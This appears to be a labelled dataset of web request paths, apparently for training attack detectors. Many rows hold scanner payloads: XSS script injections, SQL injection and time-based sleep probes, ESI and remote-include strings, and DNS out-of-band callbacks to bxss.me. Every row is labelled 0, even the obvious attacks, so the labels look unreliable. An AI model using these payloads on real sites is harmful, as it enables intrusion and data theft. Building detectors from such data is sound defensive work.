sentences	labels
/**************/login.asp?server=server001&project=project001&port=0&uid=uid001&msg="><script>alert(/22xwqqqxtkywz0tqvnnir9sa20v/);</script>< \r\n\r\n 	 0
/**********/system/2020/11/24/javascript:window.close(); \r\n\r\n 	 0
/********//931/wwa060gx/xhr_send?t=1629430557460 \r\n\r\n 	 0
/****/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) \r\n\r\n 	 0
/****/p/432935.html \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/'""()&%<acx><script >srzj(9202)</script>/searchbtn.js \r\n\r\n 	 0
/*******/e9i0e94e.php \r\n\r\n 	 0
/****/zfxxgk/'""()&%<acx><script >ymrc(9547)</script>/qtfdxx/ \r\n\r\n 	 0
/**/ui/http://bxss.me/t/fit.txt/easyui/plugins/jquery.panel.js \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(1100)</script>?_=1630311739724 \r\n\r\n 	 0
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_182828d646ce6b684e7501e7a8ebacf5/><!--<textarea> \r\n\r\n 	 0
/******/ \r\n\r\n 	 0
/************/template/jcse/110105008056111/16<esi:include src=""http://bxss.me/rpb.png""/>/images/css.js \r\n\r\n 	 0
/****/web/search?channelid=299868') and 9981=5853 and '1'='1&perpage=1000 \r\n\r\n 	 0
/****/index.cfm?email="">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin \r\n\r\n 	 0
/****/gjjskmhxq/xxhd/201412/javascript:window.external.addfavorite(document.location.href,document.title) \r\n\r\n 	 0
/************/template/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/plugin/waterpull/pinterest_grid.js \r\n\r\n 	 0
/**/ui/widgets/hanweb/placeholder/placeholder' and 2*3*8=6*8 and 'zwqx'='zwqx.js \r\n\r\n 	 0
/***/0/10/01/23/10012398_666464.jpg \r\n\r\n 	 0
socket.gethostbyname(""hitzp"" ""psnxbltt2ffa1.bxss.me."")[3].to_s) ""/*****/grouppic/jquery.ad-gallery.js \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&filename=a0efc095dee8420b9552bc6c34805356.xls \r\n\r\n 	 0
/****/zjdt/csjs/gzdt/17.htm \r\n\r\n 	 0
/****/zzxxgk/tjj/"".gethostbyname(lc(""hitxv"".""hhtzqsif0d8f8.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(78).chr(117).chr(71).""_2127/jytabljg_2061/list.html \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*****/urite/urite.min.js \r\n\r\n 	 0
/****//xfs.bxss.me/202103/t20210303_2614145.html \r\n\r\n 	 0
/****/system/2007/08/08/javascript:window.print() \r\n\r\n 	 0
/xinanyanjiu' and 2*3*8=6*8 and '6tbw'='6tbw/****************/index_2.html \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl%') or 6161=0428 #&owner=1707212448&wbfileid=51419 \r\n\r\n 	 0
//***********/5/hanweb.css \r\n\r\n 	 0
/*****/edit.php?menu="">pt>alert(777); script>pt> \r\n\r\n 	 0
/******/server/news/show/title/time-for-a-heavy-harvest-new-release/src/"><script>alert(777)</script>@random4cd201e063d5c \r\n\r\n 	 0
/******/wzqh_style.css \r\n\r\n 	 0
/**/ui/widgets/hanweb/placeholder/if(now()=sysdate(),sleep(15),0).js \r\n\r\n 	 0
/****/wd-demo/index.php?c=prompt(777) \r\n\r\n 	 0
/***/col209/if(now()=sysdate(),sleep(15),0).html \r\n\r\n 	 0
/***/web/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> \r\n\r\n 	 0
/***/actionhandler/ajax_managed_services.php \r\n\r\n 	 0
/*****/index.cfm?error.diagnostics="">alert(777) \r\n\r\n 	 0
/******/system/2017/07/26/javascript:window.close(); \r\n\r\n 	 0
/**/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) \r\n\r\n 	 0
/******/visitcount/visit.jsp/<img src="javascript:alert(2034)">?type=3&i_webid=1&i_columnid=5264&i_articleid=221965 \r\n\r\n 	 0
/****/cometchat/plugins/handwrite/index.php?id="">alert(777) \r\n\r\n 	 0
/************/categorysearch.do?cateid=1&eq=1&oq=bxss.me/t/xss.html? \r\n\r\n 	 0
/****/web/search?channelid=234439&orderby=relevance&perpage=24&searchword=1') and 1869=1869  \r\n\r\n 	 0
/*/210909-2/index/3494307764'""()&%<acx><script >k7df(9901)</script>.js \r\n\r\n 	 0
/**********/system/2020/11/27/javascript:window.print() \r\n\r\n 	 0
/*****/system/2019/06/06/javascript:void(); \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15%' or 8485=8485 and '%'='&outlinepage=10 \r\n\r\n 	 0
/*******/4ecxfuf.php \r\n\r\n 	 0
/*****/system/2021/11/22/javascript:window.print() \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/********/js/news/newscontent.js \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_http://bxss.me/t/fit.txt/hygq_2064/list.html \r\n\r\n 	 0
/****/http://bxss.me/t/fit.txt?.jpg/ \r\n\r\n 	 0
/****/byysqgk/xxgkzn/list.html?new='.gethostbyname(lc('hitoa'.'tgmbremu260cf.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(80).chr(106).chr(82).' \r\n\r\n 	 0
/****/gjzqq/index.html?continent=%') or 7000=7000 /* \r\n\r\n 	 0
/***/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/******/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/js/newcalendar/config.js \r\n\r\n 	 0
/****/web/search?channelid=299868' or 6025=6025 /*&perpage=1000 \r\n\r\n 	 0
/****/mswpmm/common/signin.aspx?cbautosignin=""alert(777) \r\n\r\n 	 0
/****/bysw/201907/t20190702_139172.html?leader='.gethostbyname(lc('hitkg'.'hrueyejja7a92.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(121).chr(83).chr(119).chr(88).' \r\n\r\n 	 0
/****/20210719/javascript:void(0); \r\n\r\n 	 0
/********/?q=sdas&scope=1&x=8&y=extractvalue(1,concat(char(126),md5(1157753529))) \r\n\r\n 	 0
/****//293/8wqbt66u/xhr_send?t=1632398746026 \r\n\r\n 	 0
/***/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t \r\n\r\n 	 0
/****/js/encrypt' and 2*3*8=6*8 and 'iuwk'='iuwk/jbase64.js \r\n\r\n 	 0
/****/system/2021/09/15/javascript:window.print() \r\n\r\n 	 0
/****/system/2021/10/01/javascript:window.print() \r\n\r\n 	 0
/*****/wp-admin/post-new.php?post_type=inbound-forms&post='>alert(777) \r\n\r\n 	 0
/******/lxqz/jb/? \r\n\r\n 	 0
/**/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/20211116/javascript:void(0); \r\n\r\n 	 0
/**/mswpmm/common/signin.aspx?btnsignin=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 0
/****/'.gethostbyname(lc('hitcp'.'dwpfzfyn33299.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(118).chr(80).chr(116).chr(78).'/bmleft.html \r\n\r\n 	 0
/****/zdlygk'||'/ncwywfgz/wzs/ltq/xmb_gzdxb.htm \r\n\r\n 	 0
/****/wordpress/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 \r\n\r\n 	 0
/*******/201907/201907150955141023.html \r\n\r\n 	 0
/_dwr%' and 2*3*8=6*8 and 'afyi'!='afyi%/*********/newsvotedwr.js \r\n\r\n 	 0
/****/server-session-details.jsp?hostname=""/>alert(777) \r\n\r\n 	 0
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> \r\n\r\n 	 0
/****/web/search?channelid=299868') or 7632=7632 and '1'='1&perpage=1000 \r\n\r\n 	 0
/****/sjsb/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/****/byszx/201611/t20161121_76519.html?leader='""()&%<acx><script >f9n3(9682)</script> \r\n\r\n 	 0
/******/finderview/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 \r\n\r\n 	 0
socket.gethostbyname(""hitin"" ""apibpijvd2664.bxss.me."")[3].to_s) ""/**/art_32_237912.html \r\n\r\n 	 0
/***/mydevice/index.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl%' or 4188=5412  \r\n\r\n 	 0
/****/web/search?page=2%' or 1060=5967 and '%%'='%&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/*****/system/2020/09/16/javascript:window.close(); \r\n\r\n 	 0
/******/web/jpage/theme/default/css/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.css \r\n\r\n 	 0
/**/index.php?do=post&id=342&c=dt&a=goods& \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/****/202103/t20210303_2614145.html \r\n\r\n 	 0
/***********/userservice.aspx?dbid=5');select sleep(5) \r\n\r\n 	 0
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp \r\n\r\n 	 0
/****/zzxxgk/tjj/'""()&%<acx><script >uocq(9645)</script>_2127/jgzn_2042/list.html \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419' and 0765=0765 and '1'='1 \r\n\r\n 	 0
/******/system/2018/08/23/javascript:void(0); \r\n\r\n 	 0
/****/jjgz/202108/ \r\n\r\n 	 0
/****/zxjx/ and 1>1 \r\n\r\n 	 0
/module'||'/*****/grouppic/jquery.ad-gallery2.css \r\n\r\n 	 0
/****/photostore/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_articleid=5195&i_columnid[0]==2and 3 in &i_columnid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1289980600')))&i_webid=1&type=3 \r\n\r\n 	 0
/****/班列动态 \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/""><script>alert(645)</script>?_=1630311538664 \r\n\r\n 	 0
/********/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 0
/************/template/jcse/110105008056111/16<esi:include src=""http://bxss.me/rpb.png""/>/images/condition.js \r\n\r\n 	 0
/*/fupin/index/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/***/com/_log/error_log \r\n\r\n 	 0
/****/xxgknb/bxss.me/list.html \r\n\r\n 	 0
/****/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 0
/****/xxgkml/zfczyjs/list.html?new=0.6182148547908533&wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") \r\n\r\n 	 0
//***********/zzxxgk/tjj/ \r\n\r\n 	 0
/***/index.php?title=acunetixtest72b7a8&action=submit \r\n\r\n 	 0
/****/byysqgk/ybjsqzn/'""()&%<acx><script >r8on(9322)</script>.html \r\n\r\n 	 0
/*********/20200511/javascript:void(0); \r\n\r\n 	 0
/**********/system/2021/11/10/javascript:void(0); \r\n\r\n 	 0
/*****/20210526/javascript:void(0); \r\n\r\n 	 0
/cgi-bin/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 0
/****/zfwjn/1088/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/vsb_news_search_entry.js \r\n\r\n 	 0
/**/main/messages/outbox.php?f=social"" onmouseover=""confirm(777) \r\n\r\n 	 0
/****/view.php?aid=65535 \r\n\r\n 	 0
/************/search/mainframe.do?begin=20201023&end=20211023&eq=1&oq=if(now()=sysdate(),sleep(15),0)&p=1&pg=1&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/**/system/2021/10/21/javascript:void(0); \r\n\r\n 	 0
/**********/system/2021/01/06/javascript:void(); \r\n\r\n 	 0
/**/annonce/moteur-prix.php?categoriemoteur=1"">alert(777); \r\n\r\n 	 0
/*******/kdxl.php \r\n\r\n 	 0
/******/1/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.js \r\n\r\n 	 0
/***/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> \r\n\r\n 	 0
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) \r\n\r\n 	 0
/****/zjdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/zcwj/1.htm \r\n\r\n 	 0
/******/system/2018/02/06/javascript:window.close(); \r\n\r\n 	 0
/******/system/2021/03/13/javascript:window.print() \r\n\r\n 	 0
/****/frontcontroller?domainname=<script>alert(77729</script>&operation=160 \r\n\r\n 	 0
/***/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 0
/***/0/10/28/10/10281001_688737.jpg \r\n\r\n 	 0
/******/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='"><script>alert(77729;</script> \r\n\r\n 	 0
/****/rest/prototype/1/session/check/something<img src=a onerror=alert(777)> \r\n\r\n 	 0
/****/admin/edit.php?menu="">pt>alert(777); script>pt> \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_articleid=242356&i_columnid=if(now()=sysdate(),sleep(15),0)&i_webid=1&type=3 \r\n\r\n 	 0
/************/template/jcse/110105008056111/16<esi:include src=""http://bxss.me/rpb.png""/>/images/view.js \r\n\r\n 	 0
/**********/system/2021/12/19/javascript:window.print() \r\n\r\n 	 0
/******/system/2017/11/28/javascript:void(0); \r\n\r\n 	 0
/****/system/2021/04/17/javascript:window.close(); \r\n\r\n 	 0
/****/wp-admin/admin-ajax.php \r\n\r\n 	 0
/**/index.php?do=post&id=321&c=dt&a=goods& \r\n\r\n 	 0
/****/rsxcsx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/****/byysqgk/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*/jquery.ellipsis.js \r\n\r\n 	 0
/*****/mswpmm/common/newaccount.aspx?btncancel=alert(777) \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/******/ywdt/10.htm \r\n\r\n 	 0
/************/common-problem/jyxg/2017-0'xor(if(now()=sysdate(),sleep(22),0))xor'z-15/405.html \r\n\r\n 	 0
/*******/erf13z8q.php \r\n\r\n 	 0
/***/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 \r\n\r\n 	 0
/skin%' and 2*3*8=6*8 and 'bcuc'!='bcuc%/**/encrypt/jbase64.js \r\n\r\n 	 0
/****/ghgz/202011/t20201126_259396.html' and 'x'='y \r\n\r\n 	 0
/if(now()=sysdate(),sleep(15),0)/****/jcgc/ \r\n\r\n 	 0
/*****/20210607/javascript:void(0); \r\n\r\n 	 0
/*****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 \r\n\r\n 	 0
/vc"" and 2*3*8=6*8 and ""hisy""=""hisy/**/lib/easyui/themes/bootstrap/linkbutton.css \r\n\r\n 	 0
/***/nbhd/opengovmsgbox.do?appid=4&method=listgovmsgboxs&pagesize=5&siteid=115<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(1010)</script>?_=1630311687607 \r\n\r\n 	 0
/***/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/admin/edit.php?title="">pt>alert(777);< /script>pt> \r\n\r\n 	 0
/****/zzxxgk/"".gethostbyname(lc(""hitjs"".""olkrdhoe47415.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(81).chr(110).chr(74).""/zfxxgkml_2127/jgzn_2042/list.html \r\n\r\n 	 0
/**/ui'||'/script/page.js \r\n\r\n 	 0
/************/template'||'/jcse/110105008056111/16/images/jquery.cookie.js \r\n\r\n 	 0
/'""()&%<acx><script >jl8q(9585)</script>/**/lib/easyui/plugins/jquery.linkbutton.js \r\n\r\n 	 0
/**********/system/2021/06/03/javascript:void(0); \r\n\r\n 	 0
/****/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 0
/***/resource/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_117591c92de8950a0e3021ce67a6b70f/><!--<textarea> \r\n\r\n 	 0
/****/zfwjn/1079/1080/list.html?new="".gethostbyname(lc(""hitnl"".""whfitphb43aea.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(116).chr(73).chr(112).chr(67)."" \r\n\r\n 	 0
/******/system/2016/04/11/javascript:window.close(); \r\n\r\n 	 0
/************/template/jcse<esi:include src=""http://bxss.me/rpb.png""/>/110105008056111/16/images/view.js \r\n\r\n 	 0
/******/web/jpage/theme' and 2*3*8=6*8 and 'sid0'='sid0/simple/css/jpage.css \r\n\r\n 	 0
/****/czgk/bmyjs/qtdw/zzqhtglzx/\"javascript:void(0)\" \r\n\r\n 	 0
socket.gethostbyname(""hittm"" ""roznikxp89cf8.bxss.me."")[3].to_s) ""/*****/201610/t20161016_531.html \r\n\r\n 	 0
/***/bxss.me/7/12/art_35_234319.html \r\n\r\n 	 0
/***/2021/10/11/art"" and 2*3*8=6*8 and ""frrj""=""frrj_34_242319.html \r\n\r\n 	 0
/****/contact-e38709.json?company_id=38709&article_id=0&version=v3&type=header \r\n\r\n 	 0
/******/resource/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/centercutimg.js \r\n\r\n 	 0
/****/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 \r\n\r\n 	 0
/*****/index.html \r\n\r\n 	 0
/***/api/alert(777) \r\n\r\n 	 0
/************/template/jcse/bxss.me/16/images/main.css \r\n\r\n 	 0
/********/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) \r\n\r\n 	 0
/******/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/*****/index/detail/art_id'||'/239.html \r\n\r\n 	 0
/**/carbon/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) \r\n\r\n 	 0
/****/sso?ssocallback=getusid&r=1631942466236'||' \r\n\r\n 	 0
/***/nameko.php?op=999&id=&colorset=violet&fontsize=11; }</style><script>alert(777)</script><style>body { font-size:66 \r\n\r\n 	 0
/***********/shichangzixun/caiwuyaowen/2020-08-07/10166.html \r\n\r\n 	 0
/*******/xan6c.php \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419') and 1645=1645  \r\n\r\n 	 0
/****/"><script>alert(86)</script> \r\n\r\n 	 0
/*****/system/2021/12/01/javascript:void(); \r\n\r\n 	 0
/*******/jlpecgnp.php \r\n\r\n 	 0
/******/'""()&%<acx><script >evhi(9657)</script>/jpage/theme/default/css/jpage.css \r\n\r\n 	 0
/****/czgk/bmyjs/zzqzx/zzqzxbgt/\"javascript:void(0)\" \r\n\r\n 	 0
/**********/system/2012/02/02/javascript:dozoom(14) \r\n\r\n 	 0
/**/index.php?do=post&id=358&c=dt&a=goods& \r\n\r\n 	 0
/***/2021/10/12/art'||'_31_242356.html \r\n\r\n 	 0
/******//xfs.bxss.me/xys.css \r\n\r\n 	 0
/****/byszf/202007/t20200701_168748.html?leader=徐　峰<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/************/bxss.me/jcse/110105008056111/16/images/main.css \r\n\r\n 	 0
/*****/index' and 2*3*8=6*8 and 'tlrg'='tlrg/detail/art_id/239.html \r\n\r\n 	 0
/************/common-problem'||'/jyxg/2017-02-15/406.html \r\n\r\n 	 0
/****/yqzt/qyddt/202005/t20200527_247881.html' and 'x'='x \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(4792)">?_=1630312164522 \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/main.css \r\n\r\n 	 0
/***/0/11/00/43/11004354_507055.jpg \r\n\r\n 	 0
/****/category/guowaishichangzhunru?page=*/-->'""></iframe></script></style></title></textarea><script >alert(32704)</script> \r\n\r\n 	 0
/****/wzdt.htm \r\n\r\n 	 0
/***/col17/index.html/<img src="javascript:alert(681)"> \r\n\r\n 	 0
/****/system/2017/08/03/012375318.shtml \r\n\r\n 	 0
/**/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php \r\n\r\n 	 0
/****/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 0
/****/zjdt/jsgcxfjg/gzdt'||'.htm \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/zws/hyx'||'/xmb_gzdxb.htm \r\n\r\n 	 0
/*****/system/2019/10/28/javascript:window.close(); \r\n\r\n 	 0
/******/n42748'||'/c1719357/content.html \r\n\r\n 	 0
/****/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 8168=7196 and '%%'='% \r\n\r\n 	 0
/*******/0xfr011.php \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/******/bzxajgc/gys/jyx.htm \r\n\r\n 	 0
/****/web/search?channelid=222832; waitfor delay '0:0:2&searchword= \r\n\r\n 	 0
/******/n236753/n236776'||'/c1649498/content.html \r\n\r\n 	 0
/****/byszf/201610/t20161016_542.html?leader='""()&%<acx><script >x0cu(9289)</script> \r\n\r\n 	 0
/******/resource/js'||'/gotopage.js \r\n\r\n 	 0
/****/xyfw/ and 1=1 \r\n\r\n 	 0
/**/ui/widgets/hanweb/validity/css"" and 2*3*8=6*8 and ""tqiu""=""tqiu/validity.css \r\n\r\n 	 0
/******/resource' and 2*3*8=6*8 and 'wtzd'='wtzd/js/vsb_news_search.js \r\n\r\n 	 0
/****/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl and 1426=1426--&owner=1707212448&wbfileid=51419 \r\n\r\n 	 0
/**/cgi-bin/ipinfo.cgi?alert(777) \r\n\r\n 	 0
/*/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 0
/***/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25 \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_articleid[0]==2and 3 in &i_articleid[1]=extractvalue(1,concat(char(126),md5(1121657788)))&i_columnid=15&i_webid=1&type=3 \r\n\r\n 	 0
/*****/index.php?action=list&order=name&srt=yes&lang=en"/><script>alert(777);</script> \r\n\r\n 	 0
/****/zzxxgk/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/zfxxgkml_2127/jytabljg_2061/list.html \r\n\r\n 	 0
/****/index.cfm?field="">alert(777) \r\n\r\n 	 0
/************/interfaces/autocomplete.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(4987)</script>?_=1630312235646 \r\n\r\n 	 0
/****/web/search?iptsword=*/-->'""></iframe></script></style></title></textarea><script >alert(05096)</script> \r\n\r\n 	 0
/************/search.do?tpl=16&pq=1&begin=1&websiteid=110105008056111&end=1&pos=1&q=请输入关键词'||'&eq=1&pg=1&searchid=1&oq=1&p=1 \r\n\r\n 	 0
/****/category/siluzhibo?page=1'""()&%<acx><script >4gsn(9067)</script> \r\n\r\n 	 0
/****/qzfwj/5620/5639/index.html \r\n\r\n 	 0
/******/qhkc/jh/<img src="javascript:alert(276)"> \r\n\r\n 	 0
/*******/ky16d.php \r\n\r\n 	 0
/**/ui/lib"" and 2*3*8=6*8 and ""3dhd""=""3dhd/security/sm2_util.js \r\n\r\n 	 0
/**/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> \r\n\r\n 	 0
/******/system/2021/03/15/javascript:void(); \r\n\r\n 	 0
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/ygcdryzzs/\"javascript:void(0)\" \r\n\r\n 	 0
/****/gfxwj/5619/5625/\"javascript:void(0)\" \r\n\r\n 	 0
/*****/system/2019/03/22/javascript:void(); \r\n\r\n 	 0
/****/wlzj/202103'""()&%<acx><script >0gna(9394)</script>/t20210303_2614145.html \r\n\r\n 	 0
/****/'.gethostbyname(lc('hitwa'.'wqcgmnhy36344.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(80).chr(99).chr(74).'/1088/1110/list.html \r\n\r\n 	 0
/**********/system/2012/09/14/010886815.shtml \r\n\r\n 	 0
/****/system/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/*********/user/findpass_msg.html?ac=email' and 2734=2624 and 'vjqz'='vjqz \r\n\r\n 	 0
/***//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> \r\n\r\n 	 0
/**/vclogin"" and 2*3*8=6*8 and ""rkwf""=""rkwf.do \r\n\r\n 	 0
/****/web/search/search?page=3&channelid=287219&searchword=1' and 8114=5748 and 'zlep'='zlep&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 0
/******/system/2017/12/21/javascript:window.print() \r\n\r\n 	 0
/***/col109/index.html/<img src="javascript:alert(6383)"> \r\n\r\n 	 0
/****/server/news/show/title/time-for-a-heavy-harvest-new-release/src/"><script>alert(777)</script>@random4cd201e063d5c \r\n\r\n 	 0
/***/index.php?m=member&c=index&a=register&siteid=1 \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1%' or 2025=8266 and '%%'='%&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/ssgs/lkgx/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477 and 3892=5327--&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
